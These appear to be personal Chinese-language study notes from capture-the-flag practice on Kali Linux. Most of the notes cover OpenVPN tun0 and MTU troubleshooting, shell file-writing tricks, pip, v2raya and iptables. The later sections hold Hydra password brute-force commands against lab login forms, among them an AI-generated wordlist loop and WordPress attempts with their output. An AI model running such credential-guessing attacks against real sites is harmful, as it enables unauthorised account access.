## 手动创建 `tun0` 接口

1. **加载 `tun` 模块** 首先，确保 `tun` 模块已加载。运行以下命令：
   
    bash复制
    
    ```bash
    sudo modprobe tun
    ```
    
    然后，检查模块是否加载成功：
    
    bash复制
    
    ```bash
    lsmod | grep tun
    ```
    
    如果有输出，说明模块已加载。
    
2. **使用 `openvpn` 创建 `tun0` 接口** 使用 `openvpn` 的 `--mktun` 选项来创建 `tun0` 接口。运行以下命令：
   
    bash复制
    
    ```bash
    sudo openvpn --mktun --dev tun0
    ```
    
    这个命令会尝试创建一个名为 `tun0` 的虚拟网络接口。
    
3. **验证接口是否创建成功** 使用 `ip` 或 `ifconfig` 命令检查 `tun0` 接口是否已创建：
   
    bash复制
    
    ```bash
    ip addr show tun0
    ```
    
    或者：
    
    bash复制
    
    ```bash
    ifconfig tun0
    ```

tun0端口没配成功ip

```
┌──(azou㉿kali)-[~/下载]
└─$ ip addr show tun0
4: tun0: <POINTOPOINT,MULTICAST,NOARP> mtu 1500 qdisc noop state DOWN group default qlen 500
    link/none
```


#### 1. **检查当前运行的 OpenVPN 进程**

首先，你需要找出当前正在运行的 OpenVPN 进程。运行以下命令来查看所有 OpenVPN 进程：

bash复制

```bash
ps aux | grep openvpn
```

或者，使用更简洁的命令：

bash复制

```bash
pgrep -a openvpn
```




### 1. **手动调整 MTU 值**

你可以尝试手动调整 MTU 值，以确保它适合你的网络环境。

#### 检查当前 MTU 值

首先，检查当前的 MTU 值：

bash复制

```bash
ip link show tun0
```

或者：

bash复制

```bash
ifconfig tun0
```

你会在输出中看到类似以下的内容：

`tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 ...`

这里的 `mtu 1500` 表示当前的 MTU 值为 1500。

#### 调整 MTU 值

如果需要调整 MTU 值，可以使用以下命令：

bash复制

```bash
sudo ip link set tun0 mtu 1400
```

将 `1400` 替换为你希望设置的 MTU 值。通常，MTU 值在 1200 到 1400 之间是比较常见的选择。

#### 验证调整后的 MTU 值

再次运行以下命令，确认 MTU 值已更改：

bash复制

```bash
ip link show tun0
```

或者：

bash复制

```bash
ifconfig tun0
```

### 2. **在 OpenVPN 配置文件中设置 MTU**

你可以在 OpenVPN 的配置文件中指定 MTU 值，以确保每次启动时都使用正确的 MTU。

#### 编辑 OpenVPN 配置文件

打开你的 OpenVPN 配置文件（如 `/home/azou/Desktop/1453160480osako.ovpn`），并添加以下行：

plaintext复制

```plaintext
mtu-disc yes
fragment 1400
mssfix 1400
```

这些选项会告诉 OpenVPN 在连接时自动调整 MTU 值。

#### 重新启动 OpenVPN

保存配置文件后，重新启动 OpenVPN：

bash复制

```bash
sudo openvpn --config /home/azou/Desktop/1453160480osako.ovpn
```

### 3. **检查网络环境**

某些网络环境（如公司网络、VPN 服务提供商等）可能会限制 MTU 值。你可以尝试以下步骤来确定合适的 MTU 值：

#### 使用 `ping` 命令测试 MTU

运行以下命令来测试 MTU 值：

bash复制

```bash
ping -M do -s 1400 8.8.8.8
```

如果返回“Message too long”错误，说明 MTU 值过高。你可以逐步减小 MTU 值，直到不再出现错误。例如：

bash复制

```bash
ping -M do -s 1300 8.8.8.8
```


不会写脚本 就只能ai生成 
第一个脚本
```
#!/bin/bash

# 定义要遍历的目录和文件前缀
wordlist_dir="."  # 当前目录，或者指定包含 file_part_* 文件的目录
wordlist_prefix="file_part_"

# 遍历所有分割文件并执行 Hydra 命令
for wordlist in ${wordlist_dir}/${wordlist_prefix}*; do
  echo "正在使用字典文件: $wordlist"
  
  # 执行 Hydra 命令，替换 ^USER^ 和 ^PASS^ 为实际字典文件和密码
  hydra -L "$wordlist" -p password123 lookup.thm http-post-form -vV "/login.php:username=^USER^&password=^PASS^:Wrong username or password. Please try again."

  # 可以根据需要加入暂停、重试等操作，避免被目标网站封禁
  # sleep 1  # 可选，控制每个命令间的间隔时间
done

```


## 4. 在搞lookup的一大段rsa秘钥 但是vim进去又没办法粘贴 我就echo那段文本进我要的文件中

**覆盖文件内容**（如果文件已存在，内容会被覆盖）：

`echo "你的文本内容" > /path/to/your/file.txt`


### 1. **使用 `echo` 和输出重定向 (`>` 或 `>>`)**

如果你想将文本内容直接写入文件，可以使用 `echo` 命令结合重定向符号来完成。

- **覆盖文件内容**（如果文件已存在，内容会被覆盖）：

    `echo "你的文本内容" > /path/to/your/file.txt`
    
- **追加内容到文件末尾**（如果文件已存在，新的内容会被追加到文件末尾）：

    `echo "你的文本内容" >> /path/to/your/file.txt`


### 2. **使用 `cat` 和输出重定向**

你也可以使用 `cat` 命令，将多行文本复制到文件中。

- **将文本内容写入文件**：

    `cat << EOF > /path/to/your/file.txt 这是一行文本 这是第二行文本 EOF`

这条命令会将从 `EOF` 开始到 `EOF` 结束之间的文本内容写入指定的文件。如果文件存在，内容会被覆盖；如果文件不存在，则会创建该文件。

- **将文本内容追加到文件末尾**：

    `cat << EOF >> /path/to/your/file.txt 追加的内容 EOF`
### 3. **使用 `tee` 命令**

`tee` 命令可以从标准输入读取内容，并同时将其输出到文件和屏幕。你可以使用 `tee` 将文本复制到文件中。

- **覆盖文件内容**：

    `echo "你的文本内容" | tee /path/to/your/file.txt`

- **追加内容到文件末尾**

    `echo "你的文本内容" | tee -a /path/to/your/file.txt`

`tee` 命令非常有用，尤其是在你希望将输出内容既显示到屏幕上，又保存到文件中的时候。

# 在kali中使用pip来安装一些东西

创建虚拟环境(推荐在项目目录中)

python3 -m venv .venv

激活虚拟环境

source .venv/bin/activate

安装依赖

pip install -r requirements.txt



# 5. 遇到python中没有相对应的库
pip install不行

查看有库吗
apt search dulwich

安装dulwich
sudo apt install python3-dulwich

验证
python -c "import dulwich; print(dulwich.__version__)"


# 6. 配置v2raya 看日志发现是dns-out
### 1. **检查 `V2Ray` 是否监听端口**

确保 V2Ray 正在监听 `10808` 端口：

`netstat -tulnp | grep 10808`

或者：

`ss -tulnp | grep 10808`

没有看到v2raya监听这个端口

只能修改json 改一下监听端口
 vi /etc/v2ray/config.json

发现其实可以去改iptable的放行端口

```
## 放行UDP 53端口（DNS协议主用）                                      
sudo iptables -A INPUT -p udp --dport 53 -j ACCEPT
# 放行TCP 53端口（DNS协议备用）
sudo iptables -A INPUT -p tcp --dport 53 -j ACCEPT

```



1. ​**UDP协议特性**  
    UDP是无连接协议，`nc -vzu` 测试时，即使目标端口开放，也可能因服务端未响应而显示无结果。需用更可靠的方式验证：
  
     使用nmap扫描UDP 53端口
    sudo nmap -sU -p 53 8.8.8.8


# hydra的破解

```
┌──(root㉿kali)-[/home/kali]
└─# hydra -l admin -P /p.txt -s http://dc-2/wp-login.php -m "username=^USER^&password=^PASS^:The password you entered for the username admin is incorrect" -v
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-24 19:21:26
[ERROR] Invalid target definition!
[ERROR] Either you use "www.example.com module [optional-module-parameters]" *or* you use the "module://www.example.com/optional-module-parameters" syntax!

```

1. ​**参数混淆**：错误使用了 `-s`（指定端口）和 `-m`（模块参数）参数，导致目标定义语法错误。
2. ​**协议模块未明确**：未正确指定 `http-post-form` 模块，且参数格式不符合其要求。
3. ​**字段名不匹配**：WordPress 的登录表单字段通常为 `log`（用户名）和 `pwd`（密码），而非 `username`/`password`。

### **正确命令及解释**

bash

```bash
hydra -l admin -P /p.txt internal.thm http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username admin is incorrect" -v -f
```

#### ​**参数解析**：

1. ​**目标地址**：`dc-2`（假设目标主机名为 `dc-2`，若需指定端口可加 `-s 80` 或 `-s 443`）。
2. ​**协议模块**：`http-post-form`（必须显式声明）。
3. ​**模块参数**：
    - `/wp-login.php`：登录页面的路径（非完整 URL）。
    - `log=^USER^&pwd=^PASS^`：POST 参数，`^USER^` 和 `^PASS^` 为 Hydra 占位符。
    - `The password... incorrect`：失败响应内容，用于过滤错误尝试。
4. ​**其他选项**：
    - `-v`：显示详细输出。
    - `-f`：找到第一个有效密码后立即停止。

但发现很多密码都可以进去 应该是设置错参数了

```
─# hydra -l tom -P /home/kali/p.txt dc-2 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username admin is incorrect" -v
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-24 19:32:12
[DATA] max 16 tasks per 1 server, overall 16 tasks, 238 login tries (l:1/p:238), ~15 tries per task
[DATA] attacking http-post-form://dc-2:80/wp-login.php:log=^USER^&pwd=^PASS^:The password you entered for the username admin is incorrect
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[80][http-post-form] host: dc-2   login: tom   password: orci
[STATUS] attack finished for dc-2 (waiting for children to complete tests)
[80][http-post-form] host: dc-2   login: tom   password: quis
[80][http-post-form] host: dc-2   login: tom   password: non
[80][http-post-form] host: dc-2   login: tom   password: luctus
[80][http-post-form] host: dc-2   login: tom   password: ante
[80][http-post-form] host: dc-2   login: tom   password: amet
[80][http-post-form] host: dc-2   login: tom   password: vel
[80][http-post-form] host: dc-2   login: tom   password: nisi
[80][http-post-form] host: dc-2   login: tom   password: sit
[80][http-post-form] host: dc-2   login: tom   password: sem
[80][http-post-form] host: dc-2   login: tom   password: vitae
[80][http-post-form] host: dc-2   login: tom   password: site
[80][http-post-form] host: dc-2   login: tom   password: sed
[80][http-post-form] host: dc-2   login: tom   password: leo
[80][http-post-form] host: dc-2   login: tom   password: nec
[80][http-post-form] host: dc-2   login: tom   password: Sed
1 of 1 target successfully completed, 16 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-24 19:32:13

```


换个参数

```
 hydra -l admin -P /home/kali/p.txt dc-2 http-post-form \
"/wp-login.php:log=^USER^&pwd=^PASS^:S=200" -vV -f

```

但也是不行

太执着一个地方了